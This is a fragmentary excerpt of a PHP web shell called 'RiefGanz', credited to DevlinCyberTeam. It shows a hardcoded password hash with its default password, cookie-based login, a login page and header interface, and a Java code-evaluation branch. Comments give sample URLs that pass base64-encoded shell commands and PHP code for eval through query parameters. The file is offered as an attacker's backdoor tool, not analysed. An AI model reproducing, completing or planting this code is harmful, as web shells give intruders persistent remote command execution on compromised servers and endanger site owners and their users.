...
/*
	...
	Jayalah Indonesiaku
	(c)2013
	http://code.google.com/p/RiefGanz-shell

*/
$s_pass = "6f9b0a55df8ac28564cb9f63a10be8af6ab3f7c2"; // default password : RiefGanz (login and change to new password)

$s_ver = "login Bro "; // shell ver
$s_title = "RiefGanz".$s_ver; // shell title
...
if(strlen(trim($s_pass))>0){
	if(isset($_COOKIE['RiefGanz'])){
		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['RiefGanz']))) $s_auth = true;
	}
	if(isset($_GP['login'])){
		$s_login = kript($_GP['login']);
		if(strtolower(trim($s_pass)) == $s_login){
			setcookie("RiefGanz",$s_login,time() + $s_login_time);
			$s_auth = true;
		}
	}
	if(isset($_GP['x']) && ($_GP['x']=='logout')){
		$persist = array("theme", "cwd");
		$s_reload = (isset($_COOKIE['RiefGanz_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
...
// this example using password 'RiefGanz' in sha1(md5()) format (s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34)
...
// example:
//		http://www.myserver.com/RiefGanz.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&cmd=dW5hbWUgLWE=
// next sample will evaluate php code 'phpinfo();' in base64 format (eval=cGhwaW5mbygpOw==)
//		http://www.myserver.com/RiefGanz.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&eval=cGhwaW5mbygpOw==
...
if(isset($_COOKIE['RiefGanz_included'])){
	if(strcmp($s_cek1,$s_cek2)!=0) $s_self = $_COOKIE['s_self'];
	else{
		$s_self = "?";
		setcookie("RiefGanz_included", "0" ,time() - $s_login_time);
	...
	if(strcmp($s_cek1,$s_cek2)!=0){
		...
		setcookie("RiefGanz_included", "1" ,time() + $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
	else{
		$s_self = "?";
		...
		if(isset($_GP['evalcode'])){
			...
			elseif(strtolower($s_lang)=='java'){
				if(preg_match("/class\ ([^{]+){/i",$s_code, $s_r)){
					...
					$s_rand = "RiefGanz_".substr(md5(time().rand(0,100)),0,8);
					$s_script = $s_rand;
...
<html>
<head>
<title>Shell By RiefGanz || 0N</title>
<meta charset="utf-8">
...
<?php if($s_auth){?>
	...
	<?php }
	?><a href='<?php echo $s_self; ?>x=logout' title='Click me to log out'>log out</a>  <a href='<?php echo $s_self; ?>x=switch' title='Click me to change theme'><span class='schemabox'>&nbsp;&nbsp;</span></a></span><table id='header'><tr><td style='width:80px;'><table><tr><td><h1><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>'>RiefGanz</a></h1></td></tr><tr><td style='text-align:right;'><div class='ver'><?php echo $s_ver; ?></div></td></tr></table></td>	<td><div class='headinfo'><?php echo $s_info; ?></div></td></tr></table></div>
...
<?php } else{ ?>
	...
	Login Shell&nbsp;<span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz' type='password' name='login' style='width:120px;' value='' />
	<input class='inputzbut' type='submit' value='Gas' name='submitlogin' style='width:80px;' />
	</form>
	</div>
<?php }?>	</td></tr></table>
<p class='footer'>DevlinCyberTeam &copy;<?php echo @date("Y",time())." "; ?>RiefGanz</p>
